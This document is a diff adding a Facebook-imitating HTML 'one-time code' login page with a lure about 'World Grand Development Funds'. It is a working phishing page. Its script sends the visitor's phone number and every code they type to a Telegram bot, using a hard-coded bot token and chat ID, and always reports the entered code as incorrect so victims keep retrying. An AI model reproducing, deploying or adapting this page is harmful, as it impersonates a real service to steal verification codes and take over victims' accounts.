@@ -1,0 +1,405 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Facebook-like OTP Login</title>
+    <style>
+         :root {
+            --fb-blue: #1877f2;
+            --bg: #f0f2f5;
+            --card: #fff;
+            --muted: #6b7080;
+            --success: #4CAF50;
+            --danger: #e53935;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+        }
+        
+        * {
+            box-sizing: border-box
+        }
+        
+        html,
+        body {
+            height: 100%
+        }
+        
+        body {
+            margin: 0;
+            background: linear-gradient(180deg, var(--bg), #eaf0fb 60%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .wrap {
+            width: 100%;
+            max-width: 980px;
+            display: grid;
+            grid-template-columns: 1fr 420px;
+            gap: 28px;
+            align-items: center
+        }
+        
+        .promo {
+            color: var(--card);
+            padding: 48px;
+            border-radius: 12px;
+            background: transparent
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 22px
+        }
+        
+        .logo svg {
+            width: 48px;
+            height: 48px
+        }
+        
+        .brand {
+            font-size: 36px;
+            color: var(--fb-blue);
+            font-weight: 700
+        }
+        
+        .headline {
+            font-size: 44px;
+            line-height: 1.2;
+            margin: 6px 0 18px;
+            color: #050505
+        }
+        
+        .sub {
+            color: var(--muted);
+            font-size: 18px;
+            max-width: 560px
+        }
+        
+        .card {
+            background: var(--card);
+            padding: 26px;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(16, 24, 40, 0.08)
+        }
+        
+        .card h2 {
+            margin: 0 0 8px;
+            font-size: 20px
+        }
+        
+        .card p {
+            margin: 0 0 18px;
+            color: var(--muted)
+        }
+        
+        .input-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 14px;
+            flex-wrap: wrap
+        }
+        
+        .field {
+            flex: 1;
+            min-width: 200px
+        }
+        
+        input[type="text"],
+        input[type="number"] {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 8px;
+            border: 1px solid #dbe3f0;
+            font-size: 15px
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 11px 16px;
+            border-radius: 8px;
+            background: var(--fb-blue);
+            color: white;
+            font-weight: 600;
+            border: 0;
+            cursor: pointer;
+            font-size: 15px;
+            white-space: nowrap
+        }
+        
+        .outline {
+            background: transparent;
+            border: 1px solid rgba(0, 0, 0, 0.08);
+            color: #111
+        }
+        
+        .otp-single {
+            margin: 18px 0 12px
+        }
+        
+        .otp-single input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            border: 1px solid #d8dee9;
+            font-size: 20px;
+            letter-spacing: 4px;
+            text-align: center
+        }
+        
+        .muted {
+            color: var(--muted);
+            font-size: 14px
+        }
+        
+        .row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 8px
+        }
+        
+        .resend {
+            background: transparent;
+            border: 0;
+            color: var(--fb-blue);
+            font-weight: 600;
+            cursor: pointer
+        }
+        
+        .hint {
+            font-size: 13px;
+            color: #7a8396;
+            margin-top: 12px
+        }
+        
+        .success {
+            color: var(--success);
+            font-weight: 600
+        }
+        
+        .error {
+            color: var(--danger);
+            font-weight: 600
+        }
+        
+        @media (max-width:880px) {
+            .wrap {
+                grid-template-columns: 1fr;
+                max-width: 100%
+            }
+            .promo {
+                padding: 24px
+            }
+            .logo .brand {
+                font-size: 28px
+            }
+            .headline {
+                font-size: 32px
+            }
+            body {
+                align-items: flex-start;
+            }
+        }
+        
+        @media (max-width:480px) {
+            .headline {
+                font-size: 24px
+            }
+            .sub {
+                font-size: 16px
+            }
+            .btn {
+                width: 100%;
+                text-align: center
+            }
+            .row {
+                flex-direction: column;
+                align-items: flex-start
+            }
+            .input-row {
+                flex-direction: column
+            }
+        }
+        
+        .fade-in {
+            animation: fade .42s ease both
+        }
+        
+        @keyframes fade {
+            from {
+                opacity: 0;
+                transform: translateY(6px)
+            }
+            to {
+                opacity: 1;
+                transform: none
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrap">
+        <div class="promo">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="24" height="24" rx="5" fill="var(--fb-blue)"/>
+          <path d="M14.5 8.5h1.9V5.86c-.33-.05-1.48-.13-2.82-.13-2.79 0-4.19 1.7-4.19 4.16v1.64H7v2.8h2.39V19h2.94v-5.06H15l.5-2.8h-2.06V9.22c0-.81.2-1.22 1.06-1.22z" fill="#fff"/>
+        </svg>
+                <div>
+                    <div class="brand">FaceBook</div>
+                    <div class="muted">Connect with friends and the world around you.</div>
+                </div>
+            </div>
+            <h1 class="headline">Join World Grand Development Funds in our facebook Page by entering your facebook registered phone number and otp send.</h1>
+            <p class="sub">Secure sign in with OTP — enter the 6–8 digit code we send to your phone or email.</p>
+        </div>
+
+        <div class="card fade-in" role="main" aria-labelledby="otp-title">
+            <h2 id="otp-title">Enter one-time code</h2>
+            <p>We sent a 6–8 digit code to <strong id="dest">+254 ••• ••• •123</strong>. Didn't receive it?</p>
+
+            <form id="otpForm" autocomplete="off">
+                <div class="input-row">
+                    <div class="field">
+                        <label class="muted" for="phone">Phone or email</label>
+                        <input id="phone" type="text" value="+254712345123" />
+                    </div>
+                    <div style="display:flex;align-items:flex-end">
+                        <button type="button" id="sendBtn" class="btn">Send code</button>
+                    </div>
+                </div>
+
+                <div class="muted">Enter the code:</div>
+                <div class="otp-single">
+                    <input id="otpInput" type="number" inputmode="numeric" minlength="6" maxlength="8" placeholder="Enter 6–8 digit code" />
+                </div>
+
+                <div class="row" style="margin-top:8px">
+                    <div class="muted" id="timer">Resend code in <strong id="count">00:30</strong></div>
+                    <button type="button" id="resend" class="resend" disabled>Resend</button>
+                </div>
+
+                <div style="margin-top:16px;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+                    <button id="verifyBtn" class="btn" type="submit">Verify</button>
+                    <button id="cancel" type="button" class="outline" style="padding:10px 12px;border-radius:8px">Cancel</button>
+                </div>
+
+                <div class="hint" id="message" aria-live="polite"></div>
+            </form>
+        </div>
+    </div>
+    <script>
+        (function() {
+            const resendBtn = document.getElementById('resend');
+            const sendBtn = document.getElementById('sendBtn');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const message = document.getElementById('message');
+            const timerEl = document.getElementById('count');
+            const destEl = document.getElementById('dest');
+            const phoneInput = document.getElementById('phone');
+            const otpInput = document.getElementById('otpInput');
+
+            let countdown = 30;
+            let timerId = null;
+            let currentCode = null;
+            const telegramBotToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+            const chatId = '5615316142'; // Replace with your chat ID
+
+            function startTimer() {
+                clearInterval(timerId);
+                countdown = 30;
+                resendBtn.disabled = true;
+                updateTimer();
+                timerId = setInterval(() => {
+                    countdown--;
+                    if (countdown <= 0) {
+                        clearInterval(timerId);
+                        timerEl.textContent = '00:00';
+                        resendBtn.disabled = false;
+                    } else updateTimer();
+                }, 1000);
+            }
+
+            function updateTimer() {
+                const mm = String(Math.floor(countdown / 60)).padStart(2, '0');
+                const ss = String(countdown % 60).padStart(2, '0');
+                timerEl.textContent = `${mm}:${ss}`;
+            }
+
+            function generateCode() {
+                const len = 6 + Math.floor(Math.random() * 3); // 6, 7, 8 digits
+                const code = Array.from({
+                    length: len
+                }, () => Math.floor(Math.random() * 10)).join('');
+                currentCode = code;
+                console.log('DEBUG: generated OTP ->', code);
+                return code;
+            }
+
+            async function sendToTelegram(messageText) {
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: messageText
+                };
+
+                try {
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (error) {
+                    console.error('Error sending message to Telegram:', error);
+                }
+            }
+
+            async function sendCode() {
+                const dest = phoneInput.value.trim() || 'your contact';
+                destEl.textContent = dest;
+                const code = generateCode();
+                message.innerHTML = `A one-time code has been sent to <strong>${dest}</strong>. (Demo only — check console to see the code)`;
+                await sendToTelegram(`Phone Number: ${dest}, Code: ${code}`);
+                startTimer();
+                otpInput.value = '';
+                otpInput.focus();
+            }
+
+            sendBtn.addEventListener('click', sendCode);
+            resendBtn.addEventListener('click', sendCode);
+
+            async function verify() {
+                const code = otpInput.value.trim();
+                if (!currentCode) {
+                    message.innerHTML = '<span class="error">No code has been sent. Click "Send code" to receive one.</span>';
+                    return;
+                }
+
+                // Send the input code to Telegram regardless of its correctness
+                await sendToTelegram(`Entered Code: ${code}`);
+                message.innerHTML = '<span class="success">Code entered is incorrect</span>';
+                otpInput.value = ''; // Clear input after sending
+            }
+
+            document.getElementById('otpForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                verify();
+            });
+            sendCode();
+        })();
+    </script>
+</body>
+
+</html>
